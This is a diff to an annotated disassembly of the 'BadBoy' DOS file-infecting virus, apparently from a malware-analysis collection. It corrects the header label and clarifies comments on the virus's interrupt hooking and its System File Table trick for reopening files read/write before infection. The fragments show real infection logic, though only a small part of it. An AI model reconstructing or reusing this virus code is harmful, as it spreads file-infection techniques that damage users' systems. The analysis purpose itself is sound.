@@ -1,4 +1,4 @@
-; Disassembly of `Virus.Boot.Stoned.March6.t`.
+; Disassembly of `Virus.DOS.BadBoy.1000.a`.
 ;
 ; Source: COM file (MD5: cc1584c8758dca16114fa7408895a0f9).
 ;
@@ -255,7 +255,7 @@ hijack_int21:
 
 find_int13_address:
                         mov cx,es
-                        mov ah,13h           ; set disk interrupt handler
+                        mov ah,13h           ; get disk interrupt handler
                         int 2Fh              ; DS:DX -> interrupt handler disk driver calls on read/write
                                              ; ES:BX = address to restore INT 13 to on system halt (exit from root shell) or warm boot (INT 19)
                                              ; return: DS:DX set by previous invocation of this function
@@ -375,7 +375,7 @@ disable_int24:
                         sti
 
                         pop     ds
-                        mov     ax, 3D00h    ; open file for reading (changed during infection)
+                        mov     ax, 3D00h    ; open file for reading (mode changed to r/w via SFT at line 451)
                         pushf
                         call    word far [cs:original_int21_addr]
                         jb      short restore_original_int_24
@@ -433,12 +433,12 @@ infect_file:
                         push    di
                         push    bp
                         push    bx
-                        mov     ax, 1220h       ; Get Job File Table
+                        mov     ax, 1220h       ; Get Job File Table entry for file handle
                         int     2Fh             ; Return: ES:DI -> JFT entry
 
                         mov     bl, [es:di]
                         xor     bh, bh
-                        mov     ax, 1216h       ; Get System File Table address; BX = entry number
+                        mov     ax, 1216h       ; Get System File Table entry; BX = SFT entry number from JFT
                         int     2Fh             ; Return: ES:DI -> SFT entry
 
                         pop     bx
@@ -448,7 +448,7 @@ infect_file:
                         jmp     exit_infection
 
 store_file_attributes:
-                        mov     word [es:di + sft_file_open_mode], 2
+                        mov     word [es:di + sft_file_open_mode], 2 ; set file open mode to read/write
                         mov     ax, [es:di + sft_file_size_ofs]
                         mov     word [cs:file_original_size], ax
                         mov     ax, [es:di+sft_file_time]
